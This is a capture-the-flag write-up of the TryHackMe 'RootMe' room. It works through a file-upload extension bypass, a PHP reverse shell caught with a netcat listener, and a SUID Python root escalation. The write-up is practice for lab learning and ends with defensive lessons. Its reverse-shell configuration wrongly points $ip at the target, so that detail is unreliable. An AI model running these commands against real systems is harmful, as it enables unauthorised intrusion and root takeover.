<p align="right">
  <sub>
    <b>Platform:</b> TryHackMe<br>
    <b>Difficulty:</b> Easy<br>
    <b>Status:</b> Completed ✅<br>
    <b>URL:</b> <a href="https://tryhackme.com/room/rrootme">RootMe</a><br>
    <b>Icon:</b> <img src="RootMe.png" width="32"><br>
    <b>Date:</b> February 27, 2026<br>
    <b>Tags:</b> #tryhackme #easy #thm
  </sub>
</p>

---

# RootMe

## 🧠 Overview

RootMe is a beginner-friendly Linux box focused on web exploitation and SUID-based privilege escalation. The attack chain involves discovering a file upload endpoint via directory brute-forcing, bypassing a file extension filter to upload a PHP reverse shell, and then abusing a SUID Python binary to escalate to root.

---

## 🎯 Objectives

- Gain initial foothold via a PHP reverse shell upload
- Bypass file extension filtering on the upload endpoint
- Escalate privileges using a SUID binary
- Retrieve `user.txt` and `root.txt`

---

## 🔍 Reconnaissance & Initial Analysis

I started with an nmap service scan against the target:

```bash
nmap -sV 10.10.110.118
```

![Screenshot 1](screenshot_01.png)

This revealed an open HTTP port (80) alongside SSH. With a web service running, I moved on to directory brute-forcing using Gobuster to find any hidden paths:

```bash
gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Screenshot 2](screenshot_02.png)

Gobuster uncovered an `/uploads` directory and a file upload panel — a clear target for getting a shell onto the box.

---

## ⚙️ Exploitation

I grabbed pentestmonkey's PHP reverse shell from GitHub:

> https://github.com/pentestmonkey/php-reverse-shell

I opened it in an editor and updated the connection details:

- `$ip` → `10.10.110.118`
- `$port` → `9001`

When I tried uploading the `.php` file directly, the server rejected it:

![Screenshot 3](screenshot_03.png)

The upload filter was blocking `.php` extensions. To bypass this, I renamed the file to use a `.phtml` extension — PHP still executes it, but the filter didn't catch it:

```bash
mv php_reverse_shell.php php_reverse_shell.phtml
```

The re-upload succeeded:

![Screenshot 4](screenshot_04.png)

With the shell uploaded, I started a Netcat listener:

```bash
nc -lvnp 9001
```

I then navigated to `10.10.110.118/uploads`, clicked the uploaded shell, and caught the connection. To stabilise the shell I spawned a proper TTY using Python:

```bash
which python
python -c 'import pty;pty.spawn("/bin/bash")'
```

I then located `user.txt`:

```bash
find / -type f -name user.txt 2>/dev/null
```

---

## 🔐 Privilege Escalation

With a foothold established, I searched for SUID binaries to find a privilege escalation vector:

```bash
find / -perm -u=s -type f 2>/dev/null
```

This flagged `/usr/bin/python` as SUID — meaning it runs with the owner's privileges (root). I exploited this using a standard `os.execl` technique to drop into a root shell:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves the elevated privileges, giving a full root shell.

---

## 🏁 Flags / Proof

| Flag | Value |
|------|-------|
| Root Flag | `THM{pr1v1l3g3_3sca4l4ti0n}` |

---

## 🧩 Key Takeaways

- **Extension filtering alone isn't enough** — alternate extensions like `.phtml` are often overlooked and still interpreted as PHP by the server. A proper allowlist approach (rather than a blocklist) is the fix.
- **SUID on interpreters is dangerous** — granting SUID to binaries like Python gives any user a trivial path to root. GTFOBins covers dozens of these cases.
- Always check for SUID binaries early in the privilege escalation phase — `find / -perm -u=s -type f 2>/dev/null` should be a standard step in any Linux enumeration.

---

## 🛠️ Tools & References

| Tool / Resource | Purpose |
|---|---|
| `nmap` | Port and service enumeration |
| `gobuster` | Web directory brute-forcing |
| [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell payload |
| `netcat` | Listener for catching reverse shell |
| [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/) | SUID Python privilege escalation reference |